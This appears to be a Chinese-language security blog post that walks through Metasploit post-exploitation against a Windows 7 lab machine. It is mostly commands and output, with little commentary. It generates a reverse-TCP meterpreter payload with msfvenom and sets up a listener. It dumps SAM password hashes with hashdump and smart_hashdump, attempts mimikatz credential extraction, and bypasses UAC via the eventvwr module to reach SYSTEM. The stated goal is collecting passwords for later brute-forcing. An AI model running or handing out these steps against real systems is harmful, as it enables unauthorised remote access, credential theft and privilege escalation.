---
layout: post
title: Metasploit 「信息搜集」抓取用户 HASH
comments: false
description: ""
keywords: "Tricks"
---

当拿到一台服务器后往往想着读取用户密码来丰富字典，以备之后的渗透；

## 情况？

Mac【Metasploit】：192.168.1.104

`Win7 SP1`【目标机】：192.168.1.108【桥接】

实际场景：拿到目标机权限后，希望能够获取管理账号密码，来进行信息搜集，方便之后可能需要的各种服务爆破；

生成反弹shell木马；

```
[Go0s]: ~ 
➜  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 -f exe > ~/Desktop/shell.exe 
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
```

直接在运行上线，拿到目标机的 Meterpreter shell；

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.104
lhost => 192.168.1.104
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > exploit -j -z
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.1.104:4444 
msf exploit(handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  0         meterpreter x86/windows  Go0s-PC\Go0s @ GO0S-PC  192.168.1.104:4444 -> 192.168.1.108:49266 (192.168.1.108)
msf exploit(handler) > sessions -i 0
[*] Starting interaction with 0...
```

## hashdump

一运行就提示不推荐使用，官方推荐使用 `post/windows/gather/smart_hashdump` 脚本；

结果：【成功】

```
meterpreter > run hashdump 

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY c2a7baa7f66cb32d137b2ae68f6ff9b8...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

Go0s:"Whoami?"

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Go0s:1000:aad3b435b51404eeaad3b435b51404ee:d1790be248c60dd36271892f5259c5ba:::
```

Meterpreter 本身自带有命令 hashdump：

```
Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database

meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
```

参数错误？？？

## powerdump

同 hashdump；

结果：【失败】

```
meterpreter > run powerdump 
[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
[*] Running PowerDump to extract Username and Password Hashes...
[*] Uploaded PowerDump as 50749.ps1 to %TEMP%...
[*] Setting ExecutionPolicy to Unrestricted...
[*] Dumping the SAM database through PowerShell...
[-] Error in script: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.
```

## post/windows/gather/smart_hashdump

结果：【成功】

```
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against GO0S-PC
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /Users/go0s/.msf4/loot/20180116194258_default_192.168.1.108_windows.hashes_981353.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY c2a7baa7f66cb32d137b2ae68f6ff9b8...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[+] 	Go0s:"Whoami?"
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] 	Go0s:1000:aad3b435b51404eeaad3b435b51404ee:d1790be248c60dd36271892f5259c5ba:::
```

## mimikatz

内存读取神器，不解释；

结果：【失败】

```
meterpreter > load mimikatz 
Loading extension mimikatz...
[!] Loaded x86 Mimikatz on an x64 architecture.
Success.

获取本地用户信息及密码...
meterpreter > wdigest 
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;674234  NTLM       Go0s-PC       Go0s           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (wdigest KO)
0;674197  NTLM       Go0s-PC       Go0s           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (wdigest KO)
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (wdigest KO)
0;996     Negotiate  WORKGROUP     GO0S-PC$       mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (wdigest KO)
0;51648   NTLM                                    mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (wdigest KO)
0;999     NTLM       WORKGROUP     GO0S-PC$       mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (wdigest KO)

获取kerberos用户信息及密码...
meterpreter > kerberos 
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;674234  NTLM       Go0s-PC       Go0s           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (kerberos KO)
0;674197  NTLM       Go0s-PC       Go0s           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (kerberos KO)
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (kerberos KO)
0;996     Negotiate  WORKGROUP     GO0S-PC$       mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (kerberos KO)
0;51648   NTLM                                    mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (kerberos KO)
0;999     NTLM       WORKGROUP     GO0S-PC$       mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō?? ReadProcessMemory  WriteProcessMemory ?B n.a. (kerberos KO)

参数如下：
Mimikatz Commands
=================

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom command
    msv               Attempt to retrieve msv creds (hashes)
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds
```

## 原因

测试目标机为 **Win7 SP1** ，存在 **UAC**，故拿到shell进行 `getsystem` 失败...

```
meterpreter > getuid
Server username: Go0s-PC\Go0s
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
meterpreter > getuid
Server username: Go0s-PC\Go0s
```

故所有测试全基于 **右键以管理员权限运行的反弹shell** 而获得了system权限后完成的；

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

用户账户控制【UAC：User Account Control】是个什么机制？

Wiki：[https://zh.wikipedia.org/wiki/使用者帳戶控制](https://zh.wikipedia.org/wiki/使用者帳戶控制)

一张图就会恍然大悟：

![QQ20180122-114021@2x.png](/assets/images/2018-01-16/608070887.png)

## 补充

评论有师傅提醒了，可以使用 **bypass_eventvwr** 来 **bypass UAC**；

补上操作；

```
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: Go0s-PC\Go0s
meterpreter > sysinfo
Computer        : GO0S-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > search bypassuac

Matching Modules
================

   Name                                              Disclosure Date  Rank       Description
   ----                                              ---------------  ----       -----------
   exploit/windows/local/bypassuac                   2010-12-31       excellent  Windows Escalate UAC Protection Bypass
   exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Windows UAC Protection Bypass (Via FodHelper Registry Key)
   exploit/windows/local/bypassuac_injection         2010-12-31       excellent  Windows Escalate UAC Protection Bypass (In Memory Injection)
   exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)


msf exploit(handler) > use exploit/windows/local/bypassuac_eventvwr
msf exploit(bypassuac_eventvwr) > show options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(bypassuac_eventvwr) > set session 1
session => 1
msf exploit(bypassuac_eventvwr) > exploit 

[-] Handler failed to bind to 192.168.1.104:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\cmd.exe /c C:\Windows\System32\eventvwr.exe
[*] Sending stage (179267 bytes) to 192.168.1.112
[*] Meterpreter session 2 opened (192.168.1.104:4444 -> 192.168.1.112:53020) at 2018-01-22 11:32:30 +0800
[*] Cleaining up registry keys ...
[*] Exploit completed, but no session was created.
msf exploit(bypassuac_eventvwr) > sessions 

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Go0s-PC\Go0s @ GO0S-PC  192.168.1.104:4444 -> 192.168.1.112:53018 (192.168.1.112)
  2         meterpreter x86/windows  Go0s-PC\Go0s @ GO0S-PC  192.168.1.104:4444 -> 192.168.1.112:53020 (192.168.1.112)

msf exploit(bypassuac_eventvwr) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > getuid
Server username: Go0s-PC\Go0s
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

弊端，由于特征明显，杀毒软件会直接报警；

![QQ20180122-113144@2x.png](/assets/images/2018-01-16/2295845515.png)

![QQ20180122-113213@2x.png](/assets/images/2018-01-16/2694180034.png)
